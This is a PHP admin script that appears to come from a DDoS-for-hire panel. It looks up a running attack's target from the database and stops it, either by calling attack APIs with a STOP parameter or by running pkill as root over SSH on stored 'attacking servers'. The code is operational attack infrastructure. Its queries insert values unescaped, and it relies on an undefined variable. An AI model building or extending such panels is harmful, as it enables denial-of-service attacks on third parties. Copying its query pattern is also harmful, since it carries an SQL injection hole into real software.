<?php

	ob_start(); 
	require_once '../../../inc/config.php';
	require_once '../../../inc/init.php'; 

	if (!($user->LoggedIn()) || !($user->notBanned($odb)) || !($user -> isAdmin($odb)) || !(isset($_SERVER['HTTP_REFERER']))) {
		die();
	}
	
	$stop      = intval($_GET['id']);
	$SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `id` = '$stop'");

	while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
		$user = $show['user'];
		$host   = $show['ip'];
		$port   = $show['port'];
		$time   = $show['time'];
		$method = $show['method'];
		$handler = $show['handler'];
		$command  = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
	}
	
	$SQL      = $odb->query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
	
	$handlers = explode(",", $handler);

	foreach ($handlers as $handler){

		if ($system == 'api') {

			$SQLSelectAPI = $odb->query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");

			while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

				$arrayFind 	  = array('[host]','[port]','[time]','[method]');
				$arrayReplace = array($host,$port,$time,$method);
				$APILink      = $show['api'];
				$APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
				$stopcommand  = "&method=STOP";
				$stopapi      = $APILink . $stopcommand;
				
				$ch           = curl_init();
				curl_setopt($ch, CURLOPT_URL, $stopapi);
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_TIMEOUT, 3);
				curl_exec($ch);
				curl_close($ch);
			}
		} else {

			$SQLSelectServers = $odb->query("SELECT * FROM `servers` WHERE `name` = '$handler'");

			while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)){
				
				$ip       = $show['ip'];
				$password = $show['password'];
				$command2 = 'pkill -f "'.$command.'"';
				
				include('./Net/SSH2.php');
				define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
				$ssh = @new Net_SSH2($ip);

				if (!$ssh->login('root', $password)) {
					die(error('Can not connect to an attacking server! Please try again in a few minutes'));
				}

				$ssh->exec($command2.' > /dev/null &');
			}
		}
	}
	die(success('Attack Has Been Stopped!'));
	
?>